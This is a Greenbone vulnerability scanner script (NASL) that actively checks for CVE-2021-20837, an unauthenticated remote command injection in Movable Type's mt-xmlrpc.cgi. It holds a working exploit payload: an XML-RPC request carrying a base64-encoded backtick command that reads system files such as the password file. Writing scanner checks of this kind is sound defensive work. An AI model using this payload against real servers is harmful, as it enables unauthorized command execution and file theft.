# SPDX-FileCopyrightText: 2021 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:sixapart:movabletype";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.147061");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2021-11-01 08:18:10 +0000 (Mon, 01 Nov 2021)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2021-10-28 18:17:00 +0000 (Thu, 28 Oct 2021)");

  script_cve_id("CVE-2021-20837");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Movable Type RCE Vulnerability (Oct 2021) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2021 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_movable_type_http_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("sixapart/movabletype/http/detected");

  script_tag(name:"summary", value:"Movable Type is prone to a remote code execution (RCE)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"Movable Type is prone to an unauthenticated remote command
  injection in mt-xmlrpc.cgi.");

  script_tag(name:"impact", value:"An unauthenticated attacker may execute arbitrary commands.");

  script_tag(name:"affected", value:"Movable Type version 4.0 and later.");

  script_tag(name:"solution", value:"See the referenced vendor advisory for a solution.");

  script_xref(name:"URL", value:"https://movabletype.org/news/2021/10/mt-782-683-released.html");
  script_xref(name:"URL", value:"https://nemesis.sh/posts/movable-type-0day/");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/mt/mt-xmlrpc.cgi";

headers = make_array("Content-Type", "text/xml; charset=UTF-8");

# Current payload only for Linux
files = traversal_files("linux");

foreach pattern (keys(files)) {
  payload = base64(str: "`cat /" + files[pattern] + "`");

  data = '<?xml version="1.0" encoding="UTF-8"?>
    <methodCall>
      <methodName>mt.handler_to_coderef</methodName>
      <params>
        <param>
          <value>
            <base64>' + payload + '</base64>
          </value>
        </param>
      </params>
    </methodCall>';

  req = http_post_put_req(port: port, url: url, data: data, add_headers: headers);
  res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

  if (egrep(pattern: pattern, string: res)) {
    info['HTTP Method'] = "POST";
    info['Affected URL'] = http_report_vuln_url(port: port, url: url, url_only: TRUE);
    info['HTTP "POST" body'] = data;
    info['HTTP "Content-Type" header'] = headers["Content-Type"];

    report  = 'By doing the following HTTP request:\n\n';
    report += text_format_table(array: info) + '\n\n';
    report += 'it was possible to read the file "/' + files[pattern] + '" from the target host.';
    report += '\n\nResult:\n\n' + res;
    expert_info = 'Request:\n\n' + req + '\n\nResponse:\n\n' + res;
    security_message(port: port, data: report, expert_info: expert_info);
    exit(0);
  }
}

exit(0);
